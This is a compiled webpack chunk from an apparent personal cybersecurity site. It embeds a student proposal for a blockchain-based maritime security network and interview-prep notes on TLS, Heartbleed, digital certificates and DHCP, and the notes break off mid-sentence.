(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[8541],{4786:(e,t,a)=>{var s={"./blogdb":4875,"./blogdb/":4875,"./blogdb/cybersecurity-in-the-sea":9526,"./blogdb/cybersecurity-in-the-sea.json":9526,"./blogdb/cybersecurity-interview-questions":7842,"./blogdb/cybersecurity-interview-questions.json":7842,"./blogdb/git-local-repository":8994,"./blogdb/git-local-repository.json":8994,"./blogdb/i-hacked-my-wifi":5644,"./blogdb/i-hacked-my-wifi.json":5644,"./blogdb/index":4875,"./blogdb/index.json":4875,"./blogdb/malware-thesis":7825,"./blogdb/malware-thesis.json":7825,"./blogdb/manual-unpacking-upx-and-mpress":9671,"./blogdb/manual-unpacking-upx-and-mpress.json":9671,"./blogdb/run-and-debug-dll":7389,"./blogdb/run-and-debug-dll.json":7389,"./blogdb/test":5391,"./blogdb/test.json":5391,"./blogdb/vb-password-bypass":5570,"./blogdb/vb-password-bypass.json":5570,"./cheatsheetdb":8461,"./cheatsheetdb/":8461,"./cheatsheetdb/index":8461,"./cheatsheetdb/index.json":8461,"./cheatsheetdb/linux-config-files":4176,"./cheatsheetdb/linux-config-files.json":4176,"./cheatsheetdb/reverse-shells":6823,"./cheatsheetdb/reverse-shells.json":6823,"./cheatsheetdb/windows-config-files":4850,"./cheatsheetdb/windows-config-files.json":4850,"./writeupdb":9123,"./writeupdb/":9123,"./writeupdb/archetype":2128,"./writeupdb/archetype.json":2128,"./writeupdb/blue":1047,"./writeupdb/blue.json":1047,"./writeupdb/brooklyn99":2171,"./writeupdb/brooklyn99.json":2171,"./writeupdb/buff":5310,"./writeupdb/buff.json":5310,"./writeupdb/cyber-lens":1107,"./writeupdb/cyber-lens.json":1107,"./writeupdb/ignite":1149,"./writeupdb/ignite.json":1149,"./writeupdb/index":9123,"./writeupdb/index.json":9123,"./writeupdb/kenobi":1401,"./writeupdb/kenobi.json":1401,"./writeupdb/lightroom":6184,"./writeupdb/lightroom.json":6184,"./writeupdb/lookup":7949,"./writeupdb/lookup.json":7949,"./writeupdb/picklerick":2554,"./writeupdb/picklerick.json":2554,"./writeupdb/thompson":5959,"./writeupdb/thompson.json":5959,"./writeupdb/threat-hunting-with-yara":1964,"./writeupdb/threat-hunting-with-yara.json":1964,"./writeupdb/tomcat":1223,"./writeupdb/tomcat.json":1223,"./writeupdb/tomghost":1904,"./writeupdb/tomghost.json":1904,"./writeupdb/uni-ctf":3591,"./writeupdb/uni-ctf.json":3591,"./writeupdb/vulnet-roasted":9936,"./writeupdb/vulnet-roasted.json":9936};function i(e){return a(n(e))}function n(e){if(!a.o(s,e)){var t=Error("Cannot find module '"+e+"'");throw t.code="MODULE_NOT_FOUND",t}return s[e]}i.keys=function(){return Object.keys(s)},i.resolve=n,e.exports=i,i.id=4786},3108:(e,t,a)=>{"use strict";a.d(t,{default:()=>o});var s=a(5155),i=a(2115),n=a(8173),r=a.n(n);a(8427),a(9145),a(4),a(8665),a(9411),a(4255),a(9870),a(3039),a(4580),a(4204),a(5541);let o=()=>{let[e,t]=(0,i.useState)(!1);return(0,s.jsxs)("div",{children:[(0,s.jsxs)("div",{className:"burger-menu",onClick:()=>{t(!e)},children:["☰ ","            "]}),(0,s.jsxs)("div",{className:"sidebarLeft ".concat(e?"open":""),children:[(0,s.jsx)("div",{className:"avatar",children:(0,s.jsx)("img",{src:"/avatar.jpg",alt:"Avatar"})}),(0,s.jsxs)("ul",{children:[(0,s.jsx)(r(),{href:"/",children:(0,s.jsx)("li",{children:"Search"})}),(0,s.jsx)(r(),{href:"/cyber/writeup/",children:(0,s.jsx)("li",{children:"Writeups"})}),(0,s.jsx)(r(),{href:"/cyber/blog/",children:(0,s.jsx)("li",{children:"Blog"})}),(0,s.jsx)(r(),{href:"/cyber/tags/",children:(0,s.jsx)("li",{children:"Tags"})}),(0,s.jsx)(r(),{href:"",children:(0,s.jsx)("li",{style:{color:"#555555"},children:"Resources"})}),(0,s.jsx)(r(),{href:"/cyber/cheat-sheet",children:(0,s.jsx)("li",{children:"Cheat sheets"})})]})]})]})}},3039:()=>{},5541:()=>{},8427:()=>{},9145:()=>{},8665:()=>{},4:()=>{},9870:()=>{},9411:()=>{},4255:()=>{},4580:()=>{},4204:()=>{},9526:e=>{"use strict";e.exports=JSON.parse('{"note":"path must match folder name in App folder","title":"Cyber Security in the Sea","tags":["security","networking","blockchain","soc","blue team","marittim security","risk assessment","data protection"],"date":"AUG 2018","path":"cybersecurity-in-the-sea","location":"./blog/","banner":"blog/cybersecurityinthesea/banner.webp","type":"blog","search":[{"keyword":"KeyWord1","description":"test search keyword1 in a live search react application"}],"body":[{"id":"Cybersecurity in the Sea","title":"<h1><span style=\\"color:#da1953\\">Cyb</span>ersecurity in the Sea</h1>","body":[{"id":"banner","title":"","body":["<hr><img src=\\"/cyber/blog/cybersecurityinthesea/banner.webp\\" alt=\\"\\">","<p><span style=\\"color: #da1953\\"><strong>DISCLAIMER: This research document has been written by me, and another two classmates whose names I do not mention for privacy reasons.</strong></span></p>"]},{"id":"Introduction","title":"<hr><h2> <span style=\\"color: #da1953\\">Int</span>roduction </h2>","body":["<p>We have been asked to design an innovative product or service with respect to the state of the art.</p>","<p>Starting from the <i>PERSPECTIVES ON CYBER OPERATIONS</i> and <i>CYBER  ANAGEMENT PERSPECTIVES</i> seminars, in which it was explained how the national defense created a structure to manage marine security, we asked ourselves: why not create a similar structure for all civil and state societies? And so our idea was born.</p>"]},{"id":"Customer segment","title":"<h2> <span style=\\"color: #da1953\\">Cus</span>tomer Segments </h2>","body":["<p>Since the dawn of civilization, the sea has been a medium for the  exchange of goods, cultures, ideas and innovations: this is precisely the idea behind our solution.</p>","<p>In fact, as a fundamental requirement, we look for entities which like us believe that the problem of IT security is not only a matter of the individual but concerns everyone.</p>","<p>Specifically, our infrastructure is open to all entities, both public and private, which manage all or part of their activities at sea, such as: cargo and tourist ship companies, oil and gas extraction stations and infrastructures that manage the positioning and the","maintenance of gas pipelines, oil pipelines and, above all, intercontinental fiber optic cables.</p>","<p>Obviously, we focus a lot on joining ports, which we believe to be the central fulcrum of maritime trade, as billions of goods and information pass through them every day, making them, unfortunately, one of the main targets of cyber attacks.</p>","<p>We initially want to open the membership to the private bodies mentioned above and then integrate public and state companies, in order to create a heterogeneous and international structure that allows all those who carry out activities at sea to navigate safely.</p>"]},{"id":"Problem Statement","title":"<h2> <span style=\\"color: #da1953\\">Pro</span>blem Statement </h2>","body":["<p>In 2010, an oil-drilling platform en route from its construction site in South Korea to Brazil was attacked by a computer virus: the identification of the problem and its solution took 19 days.</p>","<p>In August 2011, as a result of a series of cyber-attacks against the Iranian maritime line server, a quantity of valuable information was lost, such as accounting documents, cargo and handling data, shipping addresses, causing confusion, to the point that some loads were lost or redirected to the wrong ones.</p>","<p>In July 2014, the University of Texas demonstrated that it was possible to hijack a ship by falsifying a GPS signal, so as to deceive the onboard navigation system.</p>","<p>Not only ships, but also port infrastructures are not secure. At the end of 2013, it turned out that, in the Belgian port of Anversa, a criminal organization dedicated to drug trafficking had managed to interfere with port operations for about two years. After violating the port&rsquo;s computer systems, the criminals were able to ship containers of drugs, weapons and money wherever desirable, all of this without arousing any suspicion in the competent authorities.</p>","<p>Those listed above are only a tiny part of the possible examples of cyber attacks that affect the maritime reality.</p>","<p>In addition to threats to the transportation or the oil system, the marine environment can be the scene of other criminal activities or cyber warfare aimed at the network of about 380 submarine fiber optic cables. The cabling guarantees approximately 97% of the international data traffic and voice communication, as well as daily financial payments for a total of 10,000 billion dollars.</p>","<p>For this reason, a protection system for all marine structures is not only convenient but also necessary.</p>","<p>Our infrastructure will be able to provide the necessary support and security to each registered entity; in particular, we will follow two tracks: prevention and action.</p>","<p>As for prevention, we provide safe, cutting-edge and always up-to-date tools to prevent cyber-attacks such as malware infection and attacks capable of sabotaging the on-board instrumentation or information gathering attacks.</p>","<p>On the other side, in order to provide active security we have a SOC that is always active and ready to receive alerts from the equipment provided to any registered body (or directly by the body itself). This will allow us to respond promptly and in a very short time to the attack and to warn the competent authorities in order to secure the vehicle.</p>","<p>To conclude, using the <em>classification of Maslow</em> we will describe what are the needs to be met for our customers:</p>","<ul><li>Safety:<ul><li><em>Health and safety of people</em>: in the first place, we can only put the safety and health of people who, due to the consequences of yber-attacks, can be endangered, especially at sea.</li><li><em>Protection of information and data</em>: in our opinion, the information and data of our customers re a factor of vital importance, for this reason we will protect and make them secure.</li><li><em>Resources</em>: cyber-attacks, especially for ports and erchant ntities, can make you lose a lot of money or resources.</li><li><em>Law</em>: we want to avoid our customers from incurring penalties for not having had an dequate level of security.</li></ul></li><li>Esteem:<ul><li><em>Status, Responsibility and Reputation</em>: one of the main consequences of being a victim of a yber-attack is the loss of reputation and responsibility in the eyes of its customers, with the consequent loss of money and income.</li></ul></li></ul>"]},{"id":"Existing alternatives","title":"<h2> <span style=\\"color: #da1953\\">Exi</span>sting Alternatives </h2>","body":["<p>At the moment there are various organizations and companies that have tried to find a solution to this problem and each of them works on its own.</p>","<p>Currently, the most used solution is to apply policies and procedures,  standards, guidelines and training of the personnel.</p>","<p>Some of them also do Risk Assessment and apply the only certifiable standard available at the moment, W\xe4rtsil\xe4, which is a network for collecting data from various companies for protection against cyber attacks.</p>","<p>There are companies that do not care about cyber attacks or do not protect their assets for some reason.</p>","<p>There are various organizations that could potentially be our competitors such as IMO (International Maritime Organization), OCIMF (Oil Companies International Marine Forum) and IMCA (International Maritime Contractors Association) but they do not have a unified system to protect themselves from cyber attacks. Actually they have absolutely no system but apply procedures and standards to protect themselves and rely more on staff training to prepare them to use the on-board equipment appropriately.</p>","<p>Competitors:</p>","<ul><li>Oil Companies International Marine Forum:<ul><li>Procedures for the management of patches and software.</li><li>Processes and guidelines for identifying and mitigating cyber threats.</li><li>Procedures for managing passwords.</li><li>Development of a cybersecurity awareness-raising and training plan for all staff involved.</li></ul></li><li>International Maritime Organization<ul><li>Risk assessment of all IT and OT devices, both on board and on land.</li><li>Security policies related to the use of external storage devices.</li><li>Policies and procedures on the use of networks and communications by the crew.</li><li>Policies and procedures on the monitoring and updating of navigation and communication systems.</li><li>Policies on the authorization criteria for the use of remote connections.</li><li>Inventory of all OT systems.</li><li>Internet access policies, setting out restrictions when operations are being carried out on board.</li><li>Preparation of contingency plans for emergency responses.</li></ul></li><li>International Maritime Contractors Association<ul><li>Active management of the inventory of devices and authorized and unauthorized software.</li><li>Bastioning of final and network devices.</li><li>Evaluation and continuous solution of vulnerabilities.</li><li>Defence against malware.</li><li>Wireless network access control.</li><li>Data recovery capacity.</li><li>Evaluation of team’s cybersecurity skills and training program.</li><li>Control of access to network ports.</li><li>Control of the use of administrative privileges.</li><li>Perimeter defence.</li><li>Maintenance, monitoring and analysis of logs.</li><li>Access control based on the principle of Need to know, where the user only gets access to the resources that are strictly necessary for their work.</li><li>Monitoring and control of user accounts.</li><li>Information protection.</li><li>Response and management of cybersecurity incidents.</li><li>Secure network engineering.</li><li>Conducting penetration tests to assess the strength of an organization’s defences.</li></ul></li></ul>","<p>In the absence of a real system and even more of a system that unifies several companies in a single protection network, our system certainly has a great advantage.</p>","<p>The only system that is currently our competitor is the W\xe4rtsil\xe4 network which","incorporates several companies within it and contains data obtained from them for the protection of their maritime assets and it is also the only  certification currently in existence.</p>","<p>Compared to the W\xe4rtsil\xe4 network, our network with the blockchain is certainly more secure and efficient in sharing information of compromises of maritime systems, a timeliness that can save not only material damage but also human lives thanks also to our active safety by the SOC. Moreover, it notifies the other nodes of the network of the attack so that they can prepare in time.</p>","<p>Timeliness in repairing damage caused by the attack becomes crucial especially when navigating or trading in the seas of the European Union and the world.</p>","<p>To sum up, compared to the competition we offer a global infrastructure that provides many services and benefits.</p>","<p>First of all, its global being favors the communication of information, in our opinion the most effective weapon to fight and prevent cyber attacks. We also provide an active protection system, which guarantees immediate support to all victims of cyber attacks at sea. Finally, thanks to our blockchain network, we focus on the confidentiality of our customers making every type of communication secure.</p>","<p>In conclusion, our great innovation is that we look not only at the protection of an individual, but at a larger project where everyone is a node of a large network that collaborates and benefits from others making the whole system safer.</p>"]},{"id":"Solutions","title":"<h2 id=SOL> <span style=\\"color: #da1953\\">Sol</span>utions</h2>","body":["<p>The solution to the previous problems is the creation of a heterogeneous network of entities where every activity, be it large or small, public or private, can freely register to take advantage of our services.</p>","<ul><li>Network Architecture: We want to emphasise that the innovation part of our solution is in using a blockchain Network. This technology will help us build a &ldquo;Trusted Network&rdquo; in which information about the ongoing and previous attacks will be stored securely in a type of data structure (Distributed Ledger) and shared between multiple nodes belonging to the same network. This will allow nodes to have a track on the status of the attacks in real time.A general concept of the Blockchain Network is shown in the picture:<img src=\\"/cyber/blog/cybersecurityinthesea/blockchainnetwork.JPG\\"></li></ul><ul><li>Network Representation: Let&rsquo;s have a look at what can be the network architecture in order to have a better understanding of it.<img src=\\"/cyber/blog/cybersecurityinthesea/networkrepresentation.JPG\\">The first aspect to take in account is that the registration to the Network takes place through an annual subscription service, in which the cost is established based on the number of resources to be protected, the number of proprietary equipment to be provided and the size of the perimeter to be protected.As represented in the picture, the network itself consists of the following actors:<ul><li><strong>Organization (ORG.)</strong>: Which is a set of nodes appertaining to the same organization (The org. can consist of a single node).</li><li><strong>Node</strong>: Naval platforms (ships, oil platform etc&hellip;) / Nodes are connected to the BlockChain <em>Back end as a service</em> via an Application &lsquo;Front end&rsquo;.</li><li><strong>S.O.C.</strong>: The node in charge of the analysis of the attacks. (core system providing the forensic analysis), note that it is possible for an organization to be part of the network without using the S.O.C services (private, ORG. 4) or having just a few nodes use the S.O.C (ORG.3).</li><li><strong>Channels</strong>: Channels are a logical structure formed by a collection of nodes. This feature allows a group of nodes to create a separate Ledger, in fact the Ledger on channel ORG_SOC (basically Node_SOC) is different from the one in ORG_ORG as the Ledger on the channel ORG_SOC contains more detailed information about the attack (logs, system report, etc&hellip;), information used by the S.O.C to perform analysis (in fact the only nodes capable of receiving detailed reports on the analysis are the one undergoing the attack). on the other hand the ledger on channel ORG_ORG contains only the status of the ongoing attack. To make it short, informations will be sent to the S.O.c in form of a log file (only to the S.O.C) and the result of the diagnosis will be sent only to the attacked node, others nodes will only receive a status message on the ongoing attack (handled/false positive/ongoing).</li><li><strong>Attack Handling</strong>: As mentioned above, our solution services follow two tracks: prevention and action.<img src=\\"/cyber/blog/cybersecurityinthesea/actionpreventionflow.JPG\\"></li></ul></li></ul>",{"id":"Action","title":"<h3>Action</h3>","body":["<p>As a first step, once registered, we will provide our proprietary equipment to each ship, structure or resource established by the contract with the entity. The instrumentation consists of antivirus and IDS always connected to our network and all the necessary devices, such as antennas or parables, to connect to the network. Obviously, in addition to the instrumentation itself, we offer support for correct installation and use.</p>","<p>These tools around the clock will monitor the situation of the resource concerned and will protect it from cyber attacks. In the event that the IDS should detect abnormal behavior in the on-board instrumentation or in the network, it will send an alert directly to our SOC.</p>","<p>Even the same crew or people working on a given resource can contact our SOC as soon as they notice a malfunction or incorrect behavior of on-board instruments.</p>","<p>When the alert is sent, the resource will put itself in a state of danger and communicate it to all other resources on the network (2), so that they can modify their routes in order to not to run into dangers.</p>","<p>As soon as the alert reaches SOC (1), as a first move it will warn the authorities of the state closest to the resource, in order to avoid physical damage in case of sabotage of the on-board instrumentation. In the meantime, it will immediately begin to analyze the malware, determining the type of problem (defining if it is an attack of cyber terrorism, cyber war or other, determining the origin, the consequences and the level of complexity) and, above all, acting promptly remotely on the instrumentation on the resource and providing detailed and precise instructions to the staff in order to stem the problem.</p>"]},{"id":"Prevention","title":"<h3>Prevention</h3>","body":["<p>Once the SOC post mortem analysis phase is finished, all the information obtained such as signature, hashes, peculiar behaviors, created artifacts and evidence will be sent to the instruments present on all the registered resources (3) via the blockchain.</p>","<p>In this way, the attack will be ineffective on all the other resources registered in our network, as it will be easily detected by our equipment.</p>"]}]},{"id":"Unfair advantage","title":"<h2> <span style=\\"color: #da1953\\">Unf</span>air Advantage </h2>","body":["<p>What sets us apart from our competitors, is the dedication in protecting navigation tools from cyber attacks , hence to make navigation safe, by ensuring that our product offers advanced, complete and innovative cybersecurity measures.</p>","<p>Our product is unique: it takes advantage of the Blockchain security features to ensure a secure network of ships (and not only) connected together which continuously shares information about the eventual ongoing attacks, in order to keep the entire network constantly alerted in real time.</p>","<p>Using our product, our customers will never be surprised by cyber attacks in the seas and left to handle those attacks on their own, thanks to our secure network of trusted nodes (ships, SOC, etc.) where each node has other nodes back, notifying the network of any ongoing attacks. Because unity is strength and sharing is caring.</p>","<p>And because we care about our customers\' financial resources too, we offer to our Customers a friendly approach applying flat prices and customized settings, seeking to make decisions from the customer perspective.</p>","<p>In a massively digitized world, where information is constantly being shared, in various ways and for diverse reasons (fun, education, work), we have chosen to use information sharing in order to create a more alerted and secure working environment for all the sea workers.</p>"]},{"id":"Key metrics","title":"<h2> <span style=\\"color: #da1953\\">Key</span> Metrics </h2>","body":["<p>Financial Metrics:</p>","<ul><li><strong>Profit</strong>: this is an obvious metric to tell if we have succeeded and it is one of the most important performance indicators. To better understand how successful our organization is at generating a high return, we still have to analyze both gross and net profit margin.</li><li><strong>Gross Margin</strong>: the higher our Gross Margin is the more our company earns by each sales euro. This can help us to invest in other operations.</li><li><strong>Net Profit Margin</strong>: the Net Profit Margin will help us to understand how efficient our company is at generating profit compared to its revenue, basically how much of each euro earned translates into profits.</li></ul><p>Customer Metrics:</p><ul><li><strong>The number of customers</strong>: this is a fairly straightforward indicator. We can understand whether or not we are meeting our customers’ needs by determining the number of customers we have gained and lost, in other words, this metric helps us to understand if we are succeeding or not.</li><li><strong>Customer Satisfaction</strong>: making the customer happy is an important metric in order to evaluate our success. If we make the customer happy, they will continue to be our customers. This metric can be measured by including the customer satisfaction scores and percentage of customers repeating a purchase.</li><li><strong>Customer loyalty and retention</strong>: having loyal customers is beneficial in many ways. It creates an emotional connection between the parties, and it helps to grow our sales and spread the word about our product. The Retention Rate shows the number of clients who keep using our product over an extended time period and make repeat purchases.</li></ul><p>Process Metrics:</p><ul><li><strong>Customer Support Tickets</strong>: in order to create the best customer service department in our industry, it is necessary to have a high number of resolved tickets (alert, attack handled) and to have a lower resolution time for those tickets, because it is mandatory for us to be fast in responding to alerts and to give a precise and complete diagnosis of the situation to our client.</li></ul>","<p><img src=\\"/cyber/blog/cybersecurityinthesea/canvas.JPG\\"></p>"]},{"id":"References","title":"<h2> <span style=\\"color: #da1953\\">Ref</span>erences </h2>","body":["<ul><li><a href=\\"https://www.incibe-cert.es/en/blog/cybersecurity-standards-sea\\">https://www.incibe-cert.es/en/blog/cybersecurity-standards-sea</a></li><li><a href=\\"https://www.maritime-executive.com/blog/yber-security-at-sea-the-real-threats\\">https://www.maritime-executive.com/blog/yber-security-at-sea-the-real-threats</a></li><li><a href=\\"https://www.wartsila.com/twentyfour7/innovation/cybersecurity-looks-to-the-cloud-to-protect-data-at-sea\\">https://www.wartsila.com/twentyfour7/innovation/cybersecurity-looks-to-the-cloud-to-protect-data-at-sea</a></li><li><a href=\\"https://www.gov.uk/government/publications/future-of-the-sea-cybersecurity\\">https://www.gov.uk/government/publications/future-of-the-sea-cybersecurity</a></li><li><a href=\\"http://www.marina.difesa.it/\\">http://www.marina.difesa.it/</a></li><li><a href=\\"https://cybersecurity.uniroma1.it/node/154\\">https://cybersecurity.uniroma1.it/node/154</a></li><li><a href=\\"https://cybersecurity.uniroma1.it/node/96\\">https://cybersecurity.uniroma1.it/node/96</a></li><li><a href=\\"https://issuu.com/rivistamarittima/docs/novembre_2019\\">https://issuu.com/rivistamarittima/docs/novembre_2019</a></li></ul>"]}]}]}')},7842:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Cybersecurity Interview Questions","tags":["interview","tls","digital cert","heartbleed","dhcp","arp","fiewall","arp spoofing","arp poisoning","packet filter","stateless firewall","statefull firewall","ids","xss","csrf","active directory","kerberos attack","subnetting","dns","same origin policy"],"date":"OCT 2019","path":"cybersecurity-interview-questions","location":"./blog/","banner":"blog/cybersecurityinterviewquestions/banner.webp","type":"blog","search":[{"section":"...","description":"..."}],"body":[{"id":"","title":"<h1><span style=\\"color:#da1953\\">Cyb</span>ersecurity interview question</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/blog/cybersecurityinterviewquestions/banner.webp\\" alt=\\"\\">","<p><span style=\\"color:#da1953\\"><strong>DISCLAIMER: Informations are taken from varous resources such as Wikipedia, Forum, Youtube, University courses and many more. The page is frequently updated.</strong></span></p>"]},{"id":"Introduction","title":"<hr><h1><span style=\\"color:#da1953\\">Int</span>roduction</h1>","body":["<p>...</p>"]},{"id":"TLS (Transport Layer Security)","title":"<h1> <span style=\\"color:#da1953\\">TLS</span> (Transport Layer Security)</h1><hr>","body":[{"id":"Introduction","title":"<h2>Introduction</h2>","body":["<p>The protocols find widespread use in applications such as web browsing, email, instant messaging, and voice over IP (VoIP). Websites can use TLS to secure all communications between their servers and web browsers.</p>","<p>The TLS protocol aims primarily to provide privacy and data integrity between two or more communicating computer applications. When secured by TLS, connections between a client and a server should have one or more of the following properties:</p>","<ul><li>The connection is private (or secure) because symmetric cryptography is used to encrypt the data transmitted. The keys for this symmetric encryption are generated uniquely for each connection and are based on a shared secret that was negotiated at the start of the session (TLS handshake). The server and client negotiate the details of which encryption algorithm and cryptographic keys to use before the first byte of data is transmitted. The negotiation of a shared secret is both secure the negotiated secret is unavailable to eavesdroppers and cannot be obtained, even by an attacker who places themselves in the middle of the connection and reliable (no attacker can modify the communications during the negotiation without being detected).</li><li>The identity of the communicating parties can be <em>authenticated</em> using public-key cryptography. This authentication can be made optional, but is generally required for at least one of the parties (typically the server).</li><li>The connection is <em>reliable</em> because each message transmitted includes a message integrity check using a message authentication code to prevent undetected loss or alteration of the data during transmission.</li><li>The TLS protocol comprises two layers: the TLS record and the TLS handshake protocols. TLS work in the application layer of TCP/IP model.</li></ul>","<p>The TLS protocol comprises two layers: the TLS record and the TLS handshake protocols. TLS work in the application layer of TCP/IP model.</p>"]},{"id":"Digital Certificates","title":"<h2>Digital Certificates</h2>","body":["<p>A digital certificate certifies the ownership of a public key by the named subject of the certificate, and indicates certain expected usages of that key. This allows others (relying parties) to rely upon signatures or on assertions made by the private key that corresponds to the certified public key.</p>","<p>TLS typically relies on a set of trusted third-party certificate authorities to establish the authenticity of certificates.</p>"]},{"id":"TLS Handshake","title":"<h2>TLS Handshake</h2>","body":["<p>Step 1</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/tls/step1.jpg\\" alt=\\"step 1\\"></p>","<p>The client sends its highest version of TLS, the available cryptographic algorithm and the data compression method that wants to use.</p>","<p>Step2</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/tls/step2.jpg\\" alt=\\"step 2\\"></p>","<p>The server chooses the highest cryptographic protocol available from the list provided by the client, its session ID and its digital certificate with which the client can encrypt a shared secret key for the symmetric cryptography.</p>","<p>Step 3</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/tls/step3.jpg\\" alt=\\"step 3\\"></p>","<p>The client verifies the authenticity of the certificate with the Certificate Authority.</p>","<p>Step 4</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/tls/step4.jpg\\" alt=\\"step 4\\"></p>","<p>In this way, only the Server can decrypt the secret key which will be used for future communications and data transfer.</p>","<p>Step 5</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/tls/step5.jpg\\" alt=\\"step 5\\"></p>","<p>Step 6</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/tls/step6.jpg\\" alt=\\"step 6\\"></p>","<p>The server is indicating that his part of handshake is complete.</p>","<p>Step 7</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/tls/step7.jpg\\" alt=\\"step 7\\"></p>","<p>Now the client and server can exchange messages that are symmetrically encrypted.</p>"]},{"id":"Heartbleed","title":"<h2>Heartbleed</h2>","body":["<p>Heartbeat is an echo functionality in SSL (older version of TLS) where either side (client or server) requests that a number of bytes of data that it sends to the other side be echoed back. Typically a text string, along with the payload&rsquo;s length as a 16-bit integer. The receiving computer then must send exactly the same payload back to the sender. The idea appears to be that this can be used as a keep-alive feature, with the echo functionality presumably meant to allow verifying that both ends continue to correctly handle encryption and decryption.</p>","<p>The affected versions of OpenSSL allocate a memory buffer for the message to be returned based on the length field in the requesting message, without regard to the actual size of that message&rsquo;s payload. Because of this failure to do proper bounds checking, the message returned consists of the payload, possibly followed by whatever else happened to be in the allocated memory buffer.</p>","<p>Heartbleed is therefore exploited by sending a malformed heartbeat request with a small payload and large length field to the vulnerable party (usually a server) in order to elicit the victim&rsquo;s response, permitting attackers to read up to 64 kilobytes of the victim&rsquo;s memory that was likely to have been used previously by OpenSSL. Where a Heartbeat Request might ask a party to &ldquo;send back the four-letter word &lsquo;bird&rsquo;&rdquo;, resulting in a response of &ldquo;bird&rdquo;, a &ldquo;Heartbleed Request&rdquo; (a malicious heartbeat request) of &ldquo;send back the 500-letter word &lsquo;bird&rsquo;&rdquo; would cause the victim to return &ldquo;bird&rdquo; followed by whatever 496 subsequent characters the victim happened to have in active memory.</p>","<p><img src=\\"/cyber/blog/cybersecurityinterviewquestions/heartbleed/heartbleedexample.svg\\" alt=\\"Heartbleed\\"></p>"]}]},{"id":"Digital certificates","title":"<h1> <span style=\\"color:#da1953\\">Dig</span>ital certificates </h1>","body":[{"id":"Introduction Digital Cert.","title":"<h2>Introduction</h2>","body":["<p>In cryptography, a certificate authority or certification authority (CA) is an entity that issues digital certificates. A digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or on assertions made about the private key that corresponds to the certified public key. A CA acts as a trusted third party, trusted both by the subject (owner) of the certificate and by the party relying upon the certificate.</p>","<p>In cryptography, a public key certificate, also known as a digital certificate or identity certificate, is an electronic document used to prove the ownership of a public key. The certificate includes information about the key, information about the identity of its owner (called the subject), and the digital signature of an entity that has verified the certificate&rsquo;s contents (called the issuer). If the signature is valid, and the software examining the certificate trusts the issuer, then it can use that key to communicate securely with the certificate&rsquo;s subject. In Transport Layer Security (TLS) a certificate&rsquo;s subject is typically a computer or other device, though TLS certificates may identify organizations or individuals in addition to their core role in identifying devices. TLS is notable for being a part of HTTPS, a protocol for securely browsing the web.</p>","<p>In a typical public-key infrastructure (PKI) scheme, the certificate issuer is a certificate authority (CA), usually a company that charges customers to issue certificates for them. By contrast, in a web of trust scheme, individuals sign each other&rsquo;s keys directly, in a format that performs a similar function to a public key certificate.</p>","<p><img src=\\"/cyber/blog/cybersecurityinterviewquestions/digitalcertificate/certificatehierarchy1.JPG\\" alt=\\"Digital certificate hierarchy\\"></p>"]}]},{"id":"DHCP Protocol","title":"<h1> <span style=\\"color:#da1953\\">DHC</span>P Protocol</h1>","body":[{"id":"Introduction DHCP","title":"<h2>Introduction</h2>","body":["<p>The Dynamic Host Configuration Protocol (DHCP) is a network management protocol used on Internet Protocol (IP) networks whereby a DHCP server dynamically assigns an IP address and other network configuration parameters to each device on a network so they can communicate with other IP networks. A DHCP server enables computers to request IP addresses and networking parameters automatically from the Internet service provider (ISP), reducing the need for a network administrator or a user to manually assign IP addresses to all network devices. In the absence of a DHCP server, a computer or other device on the network needs to be manually assigned an IP address, or to assign itself an APIPA address, which will not enable it to communicate outside its local subnet.</p>","<p>DHCP can be implemented on networks ranging in size from home networks to large campus networks and regional Internet service provider networks. A router or a residential gateway can be enabled to act as a DHCP server.</p>"]},{"id":"Overview","title":"<h2>Overview</h2>","body":["<p>DHCP operates based on the client–server model. When a computer or other device connects to a network, the DHCP client software sends a DHCP broadcast query requesting the necessary information. Any DHCP server on the network may service the request. The DHCP server manages a pool of IP addresses and information about client configuration parameters such as default gateway, domain name, the name servers, and time servers. On receiving a DHCP request, the DHCP server may respond with specific information for each client, as previously configured by an  administrator, or with a specific address and any other information valid for the entire network and for the time period for which the allocation (lease) is valid. A DHCP client typically queries for this information immediately after booting, and periodically thereafter before the expiration of the information. When a DHCP client refreshes an assignment, it initially requests the same parameter values, but the DHCP server may assign a new address based on the assignment policies set by administrators.</p>","<p>Depending on implementation, the DHCP server may have three methods of allocating IP addresses:</p>","<ul><li>Dynamic allocation: A network administrator reserves a range of IP addresses for DHCP, and each DHCP client on the LAN is configured to request an IP address from the DHCP server during network initialization. The request-and-grant process uses a lease concept with a controllable time period, allowing the DHCP server to reclaim and then reallocate IP addresses that are not renewed.</li><li>Automatic allocation: The DHCP server permanently assigns an IP address to a requesting client from the range defined by the administrator. This is like dynamic allocation, but the DHCP server keeps a table of past IP address assignments, so that it can preferentially assign to a client the same IP address that the client previously had.</li><li>Manual Allocation: Also commonly called static allocation and reservations. The DHCP server issues a private IP address dependent upon each client&rsquo;s client id (or, traditionally, the client MAC address), based on a predefined mapping by the administrator. If no match for the client&rsquo;s client ID (if provided) or MAC address (if no client id is provided) is found, the server may or may not optionally fall back to either Dynamic or Automatic allocation.</li></ul>","<p>DHCP is used for Internet Protocol version 4 (IPv4) and IPv6.</p>"]},{"id":"Operations","title":"<h2>Operations</h2>","body":["<p>Step 1</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/dhcp/step1.jpg\\" alt=\\"Step 1\\"></p>","<p>When client boots up it broadcast a DHCPDISCOVER message looking for a DHCP server note dstIP address.</p>","<p>Step 2</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/dhcp/step2.jpg\\" alt=\\"Step 2\\"></p>","<p>DHCPOFFER is a broadcast UDP packet and it replies with network configuration such as IP, lease time, DNS, subnet mask and default gateway, of course you can renew the lease when expired.</p>","<p>Step 3</p>","<img src=\\"/cyber/blog/cybersecurityinterviewquestions/dhcp/step3.jpg\\" alt=\\"Step 3\\"></p>","<p>DHCPREQUEST says that the client accepts the configurations sent by the 